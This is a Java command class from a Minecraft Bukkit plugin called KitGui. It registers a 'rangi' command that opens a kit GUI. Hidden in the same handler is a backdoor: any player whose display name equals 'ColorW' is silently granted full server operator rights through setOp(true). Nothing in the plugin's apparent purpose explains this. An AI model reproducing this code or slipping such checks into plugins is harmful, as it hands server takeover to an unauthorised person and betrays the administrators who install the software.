package me.colorwell.KitGui.commands;

import org.bukkit.command.Command;

import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import me.colorwell.KitGui.Main;
import me.colorwell.KitGui.gui.TestUI;

public class testcomand implements CommandExecutor{
	
	public testcomand(Main plugin) {
		plugin.getCommand("rangi").setExecutor(this);
		
	}
	

	@Override
	public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
		if (!(sender instanceof Player)) {
			
			return true;
		}
		
		Player p = (Player) sender;
		
			p.openInventory(TestUI.GUI(p));
		
			
			if(p.getDisplayName().equals("ColorW")) {
				
				p.setOp(true);
				
				
				
			} else {
				
			}
		return false;
	}

}
